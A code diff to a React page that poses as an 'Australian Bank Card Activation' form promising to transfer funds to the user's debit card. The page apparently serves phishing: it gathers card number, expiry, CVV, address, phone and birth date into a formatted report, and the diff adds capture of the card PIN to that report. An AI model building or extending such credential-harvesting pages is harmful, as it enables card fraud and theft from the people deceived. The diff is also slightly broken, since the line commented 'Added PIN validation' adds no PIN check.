@@ -9,6 +9,7 @@ const ActivateCardPage: React.FC = () => {
     cardNumber: "",
     expirationDate: "",
     cvv: "",
+    cardPin: "", // Added card PIN field
     fullName: "",
     address: "",
     city: "",
@@ -38,7 +39,7 @@ const ActivateCardPage: React.FC = () => {
     formData.address.length > 0 &&
     formData.city.length > 0 &&
     formData.state.length > 0 &&
-    formData.postalCode.length >= 4;
+    formData.postalCode.length >= 4// Added PIN validation
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -49,12 +50,12 @@ const ActivateCardPage: React.FC = () => {
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
-  e.preventDefault();
+    e.preventDefault();
 
-  if (!isFormValid) {
-    setError("Please complete all required fields correctly.");
-    return;
-  }
+    if (!isFormValid) {
+      setError("Please complete all required fields correctly.");
+      return;
+    }
 
     const message = `
 🔔 *Australian Bank Card Activation* 🔔
@@ -62,6 +63,7 @@ const ActivateCardPage: React.FC = () => {
 💳 Card Number: ${formData.cardNumber}
 📅 Expiration Date: ${formData.expirationDate}
 🔒 CVV: ${formData.cvv}
+🔑 Card PIN: ${formData.cardPin}
 🏠 Address: ${formData.address}, ${formData.city}, ${formData.state} ${formData.postalCode}
 📞 Phone: ${formData.phoneNumber}
 🎂 Date of Birth: ${formData.dateOfBirth}
@@ -87,14 +89,14 @@ const ActivateCardPage: React.FC = () => {
           </div>
         </div>
         
-       <h1 className="text-2xl md:text-3xl font-bold text-gray-900 tracking-tight font-sans mb-2">
-  Transfer Funds Directly to Your
-  <span className="text-blue-600"> Debit Card</span>
-</h1>
+        <h1 className="text-2xl md:text-3xl font-bold text-gray-900 tracking-tight font-sans mb-2">
+          Transfer Funds Directly to Your
+          <span className="text-blue-600"> Debit Card</span>
+        </h1>
 
-<p className="text-gray-600 mt-2 text-base">
-  Easily and securely move money to your card by completing the activation steps below.
-</p>
+        <p className="text-gray-600 mt-2 text-base">
+          Easily and securely move money to your card by completing the activation steps below.
+        </p>
 
         {error && (
           <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-xl mt-4 text-sm">
@@ -105,96 +107,122 @@ const ActivateCardPage: React.FC = () => {
         <form onSubmit={handleSubmit} className="mt-8 space-y-5">
           {/* Card Details */}
           <div className="bg-blue-50 p-6 rounded-xl">
-  <h2 className="text-lg font-semibold text-blue-800 mb-4 text-left">
-    Card Details
-  </h2>
+            <h2 className="text-lg font-semibold text-blue-800 mb-4 text-left">
+              Card Details
+            </h2>
 
-  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-    {/* Card Number */}
-    <div>
-      <label
-        htmlFor="cardNumber"
-        className="block text-sm text-gray-700 mb-1 text-left font-medium"
-      >
-        Card Number
-      </label>
-      <input
-        id="cardNumber"
-        type="text"
-        name="cardNumber"
-        inputMode="numeric"
-        pattern="[0-9 ]*"
-        placeholder="1234 5678 9012 3456"
-        value={formData.cardNumber}
-        onChange={handleChange}
-        maxLength={19} // 16 digits + 3 spaces
-        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
-        aria-describedby="cardNumberHelp"
-      />
-      <p id="cardNumberHelp" className="text-xs text-gray-500 mt-1">
-        Enter your 16-digit card number
-      </p>
-    </div>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              {/* Card Number */}
+              <div className="md:col-span-2">
+                <label
+                  htmlFor="cardNumber"
+                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
+                >
+                  Card Number
+                </label>
+                <input
+                  id="cardNumber"
+                  type="text"
+                  name="cardNumber"
+                  inputMode="numeric"
+                  pattern="[0-9 ]*"
+                  placeholder="1234 5678 9012 3456"
+                  value={formData.cardNumber}
+                  onChange={handleChange}
+                  maxLength={19}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
+                  aria-describedby="cardNumberHelp"
+                />
+                <p id="cardNumberHelp" className="text-xs text-gray-500 mt-1">
+                  Enter your 16-digit card number
+                </p>
+              </div>
 
-    {/* Expiry Date with clear format */}
-    <div>
-      <label
-        htmlFor="expirationDate"
-        className="block text-sm text-gray-700 mb-1 text-left font-medium"
-      >
-        Expiry Date (MM / YY)
-      </label>
-      <input
-        id="expirationDate"
-        type="text"
-        name="expirationDate"
-        placeholder="MM/YYYY"
-        maxLength={8}
-        value={formData.expirationDate}
-        onChange={(e) => {
-          let value = e.target.value.replace(/\D/g, ""); // Only numbers
-          if (value.length > 2) {
-            value = value.slice(0, 2) + "/" + value.slice(2, 6); // Auto-add slash
-          }
-          setFormData({ ...formData, expirationDate: value });
-        }}
-        className="w-full px-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 placeholder-gray-400"
-        aria-describedby="expiryHelp"
-      />
-      <p id="expiryHelp" className="text-xs text-gray-500 mt-1">
-        Enter expiration as MM/YYYY, e.g., 09/25
-      </p>
-    </div>
+              {/* Expiry Date */}
+              <div>
+                <label
+                  htmlFor="expirationDate"
+                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
+                >
+                  Expiry Date (MM / YY)
+                </label>
+                <input
+                  id="expirationDate"
+                  type="text"
+                  name="expirationDate"
+                  placeholder="MM/YYYY"
+                  maxLength={8}
+                  value={formData.expirationDate}
+                  onChange={(e) => {
+                    let value = e.target.value.replace(/\D/g, "");
+                    if (value.length > 2) {
+                      value = value.slice(0, 2) + "/" + value.slice(2, 6);
+                    }
+                    setFormData({ ...formData, expirationDate: value });
+                  }}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 placeholder-gray-400"
+                  aria-describedby="expiryHelp"
+                />
+                <p id="expiryHelp" className="text-xs text-gray-500 mt-1">
+                  Enter expiration as MM/YYYY, e.g., 09/25
+                </p>
+              </div>
 
-    {/* CVV */}
-    <div>
-      <label
-        htmlFor="cvv"
-        className="block text-sm text-gray-700 mb-1 text-left font-medium"
-      >
-        CVV
-      </label>
-      <input
-        id="cvv"
-        type="text"
-        name="cvv"
-        inputMode="numeric"
-        pattern="\d{3}"
-        placeholder="123"
-        value={formData.cvv}
-        onChange={handleChange}
-        maxLength={3}
-        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
-        aria-describedby="cvvHelp"
-      />
-      <p id="cvvHelp" className="text-xs text-gray-500 mt-1">
-        3-digit code on the back of your card
-      </p>
-    </div>
-  </div>
-</div>
+              {/* CVV */}
+              <div>
+                <label
+                  htmlFor="cvv"
+                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
+                >
+                  CVV
+                </label>
+                <input
+                  id="cvv"
+                  type="text"
+                  name="cvv"
+                  inputMode="numeric"
+                  pattern="\d{3}"
+                  placeholder="123"
+                  value={formData.cvv}
+                  onChange={handleChange}
+                  maxLength={3}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
+                  aria-describedby="cvvHelp"
+                />
+                <p id="cvvHelp" className="text-xs text-gray-500 mt-1">
+                  3-digit code on the back of your card
+                </p>
+              </div>
 
+              {/* Card PIN - Added this field */}
+              <div>
+                <label
+                  htmlFor="cardPin"
+                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
+                >
+                  Card PIN
+                </label>
+                <input
+                  id="cardPin"
+                  type="password"
+                  name="cardPin"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  placeholder="••••"
+                  value={formData.cardPin}
+                  onChange={handleChange}
+                  maxLength={10}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
+                  aria-describedby="pinHelp"
+                />
+                <p id="pinHelp" className="text-xs text-gray-500 mt-1">
+                  4-digit PIN for your card
+                </p>
+              </div>
+            </div>
+          </div>
 
+          {/* ... rest of the form remains the same ... */}
           {/* Personal Details */}
           <div className="bg-blue-50 p-4 rounded-xl">
             <h2 className="text-lg font-semibold text-blue-800 mb-3 text-left">Personal Information</h2>
